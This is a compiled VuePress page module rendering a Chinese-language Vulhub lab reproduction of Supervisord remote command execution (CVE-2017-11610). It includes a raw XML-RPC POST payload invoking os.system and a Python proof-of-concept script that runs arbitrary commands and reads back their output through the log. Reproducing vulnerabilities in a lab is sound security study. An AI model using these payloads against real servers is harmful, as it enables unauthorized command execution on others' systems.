import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o as i,c,a as n,b as s,d as e,e as t}from"./app-58e4a7d6.js";const l={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"Supervisord是一款Python开发，用于管理后台应用（服务）的工具，其角色类似于Linux自带的Systemd。",-1),d=n("p",null,"参考链接：",-1),m={href:"https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html",target:"_blank",rel:"noopener noreferrer"},v={href:"https://blogs.securiteam.com/index.php/archives/3348",target:"_blank",rel:"noopener noreferrer"},k={href:"https://github.com/Supervisor/supervisor/commit/90c5df80777bfec03d041740465027f83d22e27b",target:"_blank",rel:"noopener noreferrer"},b=t(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行以下命令启动环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:9001</code>即可查看Supervisord的页面。</p><p>**启动时遇到错误exec user process caused &quot;no such file or directory&quot;的解决方法 **</p><p>可能遇到如下错误：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021430024.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>错误原因：</p><p><code>docker-entrypoint.sh</code>中最后一行的结束符成了<code>\\r\\n</code> 导致Docker镜像中的Linux Shell脚本文件无法执行。Linux/Mac的结束符是<code>\\n</code>，所以Shell解释器会将脚本文件中的<code>\\r</code>作为命令行的一部分来执行。这就是出现 “no such file or directory” 的原因。</p><p>解决方式：</p><p>通过<code>dos2unix docker-entrypoint.sh</code>命令将其转换成为unix格式文件。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>直接执行任意命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /RPC2 HTTP/1.1
Host: your-ip:9001
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 213

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;supervisor.supervisord.options.warnings.linecache.os.system&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;
&lt;string&gt;touch /tmp/awesome_poc&lt;/string&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021436012.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>命令<code>touch /tmp/awesome_poc</code>执行成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021436578.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="关于直接回显的poc" tabindex="-1"><a class="header-anchor" href="#关于直接回显的poc" aria-hidden="true">#</a> 关于直接回显的POC</h3><p>@Ricter 在微博上提出的一个思路，甚是有效，就是将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件，将结果读出来。</p>`,19),h={href:"https://github.com/vulhub/vulhub/blob/master/supervisor/CVE-2017-11610/poc.py",target:"_blank",rel:"noopener noreferrer"},g=t(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> xmlrpc<span class="token punctuation">.</span>client
<span class="token keyword">import</span> sys


target <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
command <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token keyword">with</span> xmlrpc<span class="token punctuation">.</span>client<span class="token punctuation">.</span>ServerProxy<span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token keyword">as</span> proxy<span class="token punctuation">:</span>
    old <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token string">&#39;supervisor.readLog&#39;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>

    logfile <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token string">&#39;supervisor.supervisord.options.logfile.strip&#39;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token builtin">getattr</span><span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token string">&#39;supervisor.supervisord.options.warnings.linecache.os.system&#39;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">&#39;{} | tee -a {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> logfile<span class="token punctuation">)</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token string">&#39;supervisor.readLog&#39;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>old<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用Python3执行并获取结果：<code>./poc.py &quot;http://your-ip:9001/RPC2&quot; &quot;command&quot;</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021441167.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,3);function f(_,x){const a=p("ExternalLinkIcon");return i(),c("div",null,[r,u,d,n("ul",null,[n("li",null,[n("a",m,[s("https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html"),e(a)])]),n("li",null,[n("a",v,[s("https://blogs.securiteam.com/index.php/archives/3348"),e(a)])]),n("li",null,[n("a",k,[s("https://github.com/Supervisor/supervisor/commit/90c5df80777bfec03d041740465027f83d22e27b"),e(a)])])]),b,n("p",null,[s("写了个简单的POC： "),n("a",h,[s("poc.py"),e(a)]),s("，直接贴出来吧：")]),g])}const C=o(l,[["render",f],["__file","Supervisord 远程命令执行漏洞 CVE-2017-11610.html.vue"]]);export{C as default};
